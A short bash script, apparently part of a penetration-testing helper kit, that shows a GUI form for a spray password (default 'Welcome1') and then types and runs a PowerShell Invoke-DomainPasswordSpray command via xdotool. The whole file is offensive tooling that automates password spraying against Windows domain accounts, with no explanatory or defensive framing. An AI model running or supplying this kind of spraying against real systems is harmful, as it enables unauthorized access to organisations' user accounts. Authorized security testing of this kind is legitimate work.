#!/bin/bash

: '
PowerShell: Password spray using DomainPasswordSpray.ps1.
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
SPRAY_PASSWORD_FIELD=$(form_item  "spray password" "spray_password" "Welcome1")

# Generate GUI form
generate_form "${SPRAY_PASSWORD_FIELD}"

PRAY_PASSWORD_FILE=${form_data["spray_password"]}

paste_command "Invoke-DomainPasswordSpray -Password '${PRAY_PASSWORD_FILE}'"
xdotool key Return
